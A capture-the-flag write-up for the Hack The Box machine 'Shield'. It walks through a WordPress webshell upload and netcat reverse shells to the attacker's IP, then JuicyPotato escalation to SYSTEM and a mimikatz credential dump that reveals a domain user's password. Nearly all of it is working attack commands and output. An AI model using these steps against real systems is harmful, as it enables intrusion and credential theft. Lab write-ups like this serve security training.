## --------->> Shield <<----------

// First scanning with nmap

    $ nmap -sV -A -Pn 10.10.10.29 -p-
    Nmap scan report for 10.10.10.29
    Host is up (0.11s latency).
    Not shown: 65533 filtered ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    3306/tcp open  mysql   MySQL (unauthorized)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
// Nvigating to http://10.10.10.29/ didnt give us much 
// execpt the fact its Windows IIS server(what we already know from nmap)

// lets search some potential directories with feroxbuster

    $ ./feroxbuster -u http://10.10.10.29/ -t 150

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.29/
     🚀  Threads               │ 150
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        2l       10w      152c http://10.10.10.29/wordpress
    301        2l       10w      161c http://10.10.10.29/wordpress/wp-admin
    301        2l       10w      163c http://10.10.10.29/wordpress/wp-content
    301        2l       10w      164c http://10.10.10.29/wordpress/wp-includes
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-content/themes
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/plugins
    301        2l       10w      167c http://10.10.10.29/wordpress/wp-includes/js
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/images
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-includes/css
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/uploads
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/blocks
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/upgrade
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-includes/fonts
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-admin/includes
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-admin/images
    301        2l       10w      164c http://10.10.10.29/wordpress/wp-admin/js
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/Images
    301        2l       10w      177c http://10.10.10.29/wordpress/wp-includes/images/media
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-includes/CSS
    301        2l       10w      174c http://10.10.10.29/wordpress/wp-includes/customize
    301        2l       10w      166c http://10.10.10.29/wordpress/wp-admin/user
    301        2l       10w      165c http://10.10.10.29/wordpress/wp-admin/css
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-content/Themes
    301        2l       10w      172c http://10.10.10.29/wordpress/wp-includes/widgets
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-admin/Images
    301        2l       10w      169c http://10.10.10.29/wordpress/wp-includes/text
    301        2l       10w      167c http://10.10.10.29/wordpress/wp-includes/JS
    301        2l       10w      172c http://10.10.10.29/wordpress/wp-includes/js/dist
// i tried another tool (dirsearch) 

    $ python3 dirsearch.py -u http://10.10.10.29/ -t 200

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.29/_21-07-31_21-35-35.txt

    Error Log: /home/kali/Desktop/Tools/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-07-31_21-35-35.log

    Target: http://10.10.10.29/

    [21:35:36] Starting: 
    [21:35:39] 403 -  312B  - /%2e%2e//google.com
    [21:35:57] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
    [21:35:59] 301 -    0B  - /Wordpress/  ->  http://10.10.10.29/wordpress/
    [21:36:53] 200 -    3KB - /wordpress/wp-login.php
    [21:36:55] 200 -   24KB - /wordpress/
// its seems we have wordpress CMS on the server and login page to Wordpress at http://10.10.10.29/wordpress/wp-login.php
// since we have credentials of admin:P@s5w0rd! from last box(Vaccine) lets try it using MetaSploit

    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password P@s5w0rd!
    password => P@s5w0rd!
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
    username => admin
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.10.29
    rhosts => 10.10.10.29
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
    targeturi => /wordpress
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.7
    lhost => 10.10.16.7
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 1444
    lport => 1444
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

    [*] Started reverse TCP handler on 10.10.16.7:1444 
    [*] Authenticating with WordPress using admin:P@s5w0rd!...
    [+] Authenticated with WordPress
    [*] Preparing payload...
    [*] Uploading payload...
    [*] Executing the payload at /wordpress/wp-content/plugins/URXgzTZVXX/HTaruRzgbG.php...
    [*] Sending stage (39282 bytes) to 10.10.10.29
    [*] Meterpreter session 1 opened (10.10.16.7:1444 -> 10.10.10.29:49688) at 2021-07-31 21:16:41 +0000
    [!] This exploit may require manual cleanup of 'HTaruRzgbG.php' on the target
    [!] This exploit may require manual cleanup of 'URXgzTZVXX.php' on the target
    [!] This exploit may require manual cleanup of '../URXgzTZVXX' on the target

    meterpreter > whoami
    [-] Unknown command: whoami
    meterpreter > getuid
    [-] Error running command getuid: Rex::TimeoutError Operation timed out.
    meterpreter > dir
    [-] Error running command dir: Rex::TimeoutError Operation timed out.
    meterpreter > pwd
    [-] Error running command pwd: Rex::TimeoutError Operation timed out.
    meterpreter > cd C:/Users
    [-] Error running command cd: Rex::TimeoutError Operation timed out.
    meterpreter > exit -y
    [*] Shutting down Meterpreter...

// for some reason metasploit didnt get me a stable shell to work, Navigating to http://10.10.10.29/wordpress/wp-login.php
 we ebale to connect with credentials admin:P@s5w0rd! , after login we will click: >> Appearance >> Themes >> Add New 
![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shield/1.png)

// The we have the option to upload theme, but first get nc.exe and bind shell php script

    $ cp /usr/share/webshells/php/simple-backdoor.php simple-backdoor.php
    $ cp /usr/share/windows-resources/binaries/nc.exe nc.exe
    $ ls
    nc.exe              simple-backdoor.php
// Browse for the file and click Install Now to upload
![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shield/2.png)

// should output:

    Installing Theme from uploaded file: nc.exe

    Unpacking the package…

    The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature
// Lets test simple-backdoor.php fil, Nvigate to http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir

     Volume in drive C has no label.
     Volume Serial Number is DA1D-61AB

     Directory of C:\inetpub\wwwroot\wordpress\wp-content\Uploads

    07/31/2021  10:55 PM    
              .
    07/31/2021  10:55 PM    
              ..
    02/10/2020  04:07 AM            18,093 black-shield-shape-drawing-illustration-png-clip-art-150x150.png
    02/10/2020  04:07 AM            20,083 black-shield-shape-drawing-illustration-png-clip-art-273x300.png
    02/10/2020  04:07 AM           254,028 black-shield-shape-drawing-illustration-png-clip-art-768x844.png
    02/10/2020  04:07 AM            11,676 black-shield-shape-drawing-illustration-png-clip-art.png
    02/10/2020  04:07 AM            23,065 cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
    02/10/2020  04:07 AM            36,889 cropped-black-shield-shape-drawing-illustration-png-clip-art.png
    07/31/2021  10:53 PM            59,392 nc.exe
    07/31/2021  10:55 PM               328 simple-backdoor.php
                   8 File(s)        423,554 bytes
                   2 Dir(s)  27,552,751,616 bytes free
// it worked! and we can see our nc.exe file there

// Now we can test our nc.exe file, First we need to open a listiner

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...

// Navigate in browser to http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%2010.10.16.7%201444 (Change 10.10.16.7 and 1444 to your ip and port!!!)

// We got shell !

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.29] 49875
    Microsoft Windows [Version 10.0.14393]
    (c) 2016 Microsoft Corporation. All rights reserved.

    C:\inetpub\wwwroot\wordpress\wp-content\Uploads>
// trying to catch the flag i blocked to get inside users directory duo permissions

    C:\Users> dir
     Volume in drive C has no label.
     Volume Serial Number is DA1D-61AB

     Directory of C:\Users

    02/10/2020  02:46 PM    <DIR>          .
    02/10/2020  02:46 PM    <DIR>          ..
    02/07/2020  04:43 AM    <DIR>          Administrator
    11/20/2016  06:24 PM    <DIR>          Public
    02/13/2020  10:50 AM    <DIR>          sandra
                   0 File(s)              0 bytes
                   5 Dir(s)  27,552,727,040 bytes free

    C:\Users>cd sandra
    Access is denied.
#### ----- Privilliges Escalation ------

// Checking for privilleges we have 

    C:\Users> whoami
    nt authority\iusr

    C:\Users> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name          Description                               State  
    ======================= ========================================= =======
    SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
    SeImpersonatePrivilege  Impersonate a client after authentication Enabled
    SeCreateGlobalPrivilege Create global objects                     Enabled
// we can see that we have SeImpersonate Privilege enabled, it means we can use JuicyPotato to gain permissions.
// JuicyPotato its exploit file that allows service accounts on Windows to escalate to SYSTEM by leveraging BITS 

    $ mv JuicyPotato.exe jcyp.exe
// open python http server

    $ python3 -m http.server 1445
    Serving HTTP on 0.0.0.0 port 1445 (http://0.0.0.0:1445/) ...
// and download the file in targeted machine using PowerShell

    C:\inetpub\wwwroot\wordpress\wp-content\uploads> Powershell -c "IWR -useBasicParsing http://10.10.16.7:1445/jcyp.exe -o jcyp.exe"
// in JuicyPotato Docomentation (https://github.com/ohpe/juicy-potato) we can see that JuicyPotato need a .bat file to run
// run the following command to make shell.bat file:

    C:\inetpub\wwwroot\wordpress\wp-content\uploads> echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.7 1445 > shell.bat
    C:\inetpub\wwwroot\wordpress\wp-content\uploads> dir
     Volume in drive C has no label.
     Volume Serial Number is DA1D-61AB

     Directory of C:\inetpub\wwwroot\wordpress\wp-content\uploads

    07/31/2021  11:23 PM    <DIR>          .
    07/31/2021  11:23 PM    <DIR>          ..
    02/10/2020  04:07 AM            18,093 black-shield-shape-drawing-illustration-png-clip-art-150x150.png
    02/10/2020  04:07 AM            20,083 black-shield-shape-drawing-illustration-png-clip-art-273x300.png
    02/10/2020  04:07 AM           254,028 black-shield-shape-drawing-illustration-png-clip-art-768x844.png
    02/10/2020  04:07 AM            11,676 black-shield-shape-drawing-illustration-png-clip-art.png
    02/10/2020  04:07 AM            23,065 cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
    02/10/2020  04:07 AM            36,889 cropped-black-shield-shape-drawing-illustration-png-clip-art.png
    07/31/2021  11:17 PM           347,648 jcyp.exe
    07/31/2021  10:53 PM            59,392 nc.exe
    07/31/2021  11:23 PM                97 shell.bat
    07/31/2021  10:55 PM               328 simple-backdoor.php
                  10 File(s)        771,299 bytes
                   2 Dir(s)  27,551,789,056 bytes free

    C:\inetpub\wwwroot\wordpress\wp-content\uploads> type shell.bat
    START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.7 1445 
// now open a listiner

    $ rlwrap nc -lvnp 1445
    listening on [any] 1445 ...

// run the following command for activate JuicyPotato embeded with the shell.bat file

    C:\inetpub\wwwroot\wordpress\wp-content\uploads> .\jcyp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e cmd.exe 10.10.16.7 1445" -t *
    .\jcyp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e cmd.exe 10.10.16.7 1445" -t *
    Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
    COM -> recv failed with error: 10038
// i get EROOR, checking this u can find other '-c' parameters(CLSID) in https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standart

    C:\inetpub\wwwroot\wordpress\wp-content\uploads> .\jcyp.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
    .\jcyp.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
    Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
    ......
    [+] authresult 0
    {0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM

    [+] CreateProcessWithTokenW OK

// And we got a Shell !

    $ rlwrap nc -lvnp 1445
    listening on [any] 1445 ...
    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.29] 49923
    Windows PowerShell 
    Copyright (C) 2016 Microsoft Corporation. All rights reserved.

    PS C:\Windows\system32>  whoami
    nt authority\system


// We got root.txt

    PS C:\Users\administrator\Desktop>  type root.txt
    6e9a9fd..................
    
    

## ----- Post Exploitation -----

// Since we know the machines in start point are "chained-together" and we didnt get any further info,
// Lets try to get some passes, First download mimikatz.exe with wget

    $ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip 
// unzip and extract the x64 mimikatz.exe file
// open python server to upload file

    $ python3 -m http.server 1444
    Serving HTTP on 0.0.0.0 port 1444 (http://0.0.0.0:1444/) ...
10.10.10.29 - - [31/Jul/2021 23:49:35] "GET /mimikatz.exe HTTP/1.1" 200 -

// download on targeted machine using powershell

    PS C:\Users\administrator\Desktop\tmp> IWR -useBasicParsing http://10.10.16.7:1444/mimikatz.exe -o katz.exe
    PS C:\Users\administrator\Desktop\tmp> ls

        Directory: C:\Users\administrator\Desktop\tmp


    Mode                LastWriteTime         Length Name                          
    ----                -------------         ------ ----                          
    -a----        7/31/2021  11:46 PM        1330160 katz.exe                      


// and run ./katz.exe, then enter 'sekurlsa::logonpasswords'

    S C:\Users\administrator\Desktop\tmp> .\katz.exe

      .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

    mimikatz # sekurlsa::logonpasswords

    ...

    Authentication Id : 0 ; 289603 (00000000:00046b43)
    Session           : Interactive from 1
    User Name         : sandra
    Domain            : MEGACORP
    Logon Server      : PATHFINDER
    Logon Time        : 7/31/2021 4:20:37 PM
    SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
        msv :	
         [00000003] Primary
         * Username : sandra
         * Domain   : MEGACORP
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
        tspkg :	
        wdigest :	
         * Username : sandra
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :	
         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
        ssp :	
        credman :	

    ...
    

// we have sandra's credentials ! 

         * Username : sandra
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!
